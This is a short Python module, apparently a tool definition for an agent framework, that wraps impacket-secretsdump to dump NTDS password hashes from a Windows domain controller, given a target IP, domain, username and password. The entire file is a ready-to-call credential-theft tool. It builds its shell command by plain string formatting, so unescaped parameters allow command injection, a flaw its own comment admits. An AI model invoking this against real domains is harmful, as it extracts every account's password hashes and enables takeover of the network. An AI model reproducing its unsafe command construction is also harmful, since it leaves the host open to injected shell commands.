#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NTDS哈希导出"""


from registry import tool
from utils import run_cmd
from helpers import *  # noqa: F401,F403


@tool(
    "impacket_secretsdump",
    "NTDS哈希导出",
    {
        "properties": {
            "target": {
                "type": "string",
                "description": "IP",
                "default": None,
            },
            "domain": {
                "type": "string",
                "description": "域名",
                "default": None,
            },
            "username": {
                "type": "string",
                "description": "用户名",
                "default": None,
            },
            "password": {
                "type": "string",
                "description": "密码",
                "default": None,
            },
        },
        "required": ["target", "domain", "username", "password"],
    },
)
def impacket_secretsdump_handler(params):
    # domain/user:'pass'@ip 这种拼法，密码里带单引号会把引号层次断开，遇到就改传哈希
    t=params.get("target","");d=params.get("domain","");u=params.get("username","");p=params.get("password",""); return run_cmd("impacket-secretsdump %s/%s:'%s'@%s 2>&1||echo '需impacket'" % (d,u,p,t),300)
